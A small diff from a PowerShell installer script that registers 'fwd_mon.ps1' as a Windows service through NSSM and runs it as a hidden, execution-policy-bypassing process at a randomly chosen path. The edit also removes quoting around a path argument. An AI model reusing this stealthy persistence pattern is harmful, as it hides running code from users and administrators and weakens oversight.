@@ -16,7 +16,7 @@ $fwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $fwdmonPath = "$fwdmonPath\fwd_mon.ps1"
 $serviceName = "MyfwdmonService"
 $exepath = "powershell.exe"
-$arguments = "-ep bypass -nop -w hidden $fwdmonPath -basePath `"$basePath`""
+$arguments = "-ep bypass -nop -w hidden $fwdmonPath -basePath $basePath"
 $downloadPath = "$env:temp\nssm.zip"
 
 if(-not(Test-Path -Path $nssmFolder -PathType Container)){
